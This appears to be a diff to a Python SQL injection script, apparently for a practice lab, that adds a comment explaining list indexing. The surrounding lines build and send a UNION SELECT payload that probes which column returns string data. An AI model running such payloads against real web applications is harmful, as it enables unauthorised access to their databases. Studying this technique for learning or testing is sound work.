@@ -27,6 +27,14 @@ def exploit_sqli_string_field(url, num_col):
         string = "'v2F6UA'"
         payload_list = ['null'] * num_col
         payload_list[i-1] = string
+        ''' *i is the current iteration variable, representing the column number being processed in the loop.
+
+    *i-1 is used to convert the column number to a zero-based index because lists in Python are zero-indexed. For example, if i is 1 (representing the first column), i-1 becomes 0.
+
+    *payload_list[i-1] refers to the specific element in the list (payload_list) at the calculated index.
+
+    *string is the sample string payload, which is assigned to the element at the calculated index.'''
+    
         sql_payload = "' union select " + ','.join(payload_list) + "--"
         r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
         res = r.text
